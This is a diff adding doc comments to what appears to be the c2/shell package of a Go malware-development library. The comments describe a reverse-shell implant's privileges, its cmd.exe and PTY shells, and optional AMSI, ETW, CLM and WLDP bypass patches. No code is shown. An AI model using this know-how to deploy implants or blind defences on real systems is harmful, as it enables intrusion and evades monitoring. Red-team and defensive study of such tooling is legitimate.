@@ -30,6 +30,23 @@
 // fingerprint pinning and [github.com/oioio-space/maldev/evasion]
 // before connect to dampen host-side telemetry.
 //
+// # Required privileges
+//
+// unprivileged for the connect-side implant. Spawning the local
+// command interpreter inherits the implant's token, so any
+// privilege ceiling required by post-connect activity (file
+// access, registry, service control) must already be satisfied
+// — `c2/shell` does not elevate. The optional AMSI / ETW / CLM /
+// WLDP patches likewise run in-process and need no extra
+// privilege beyond the standard own-process write to RX pages.
+//
+// # Platform
+//
+// Cross-platform reconnect+pipe loop. cmd.exe direct-I/O is
+// Windows-only; Unix builds use a creack/pty PTY around /bin/sh.
+// AMSI / ETW / CLM / WLDP patches are Windows-only no-ops on
+// other platforms.
+//
 // # Example
 //
 // See [ExampleNew] in shell_example_test.go.
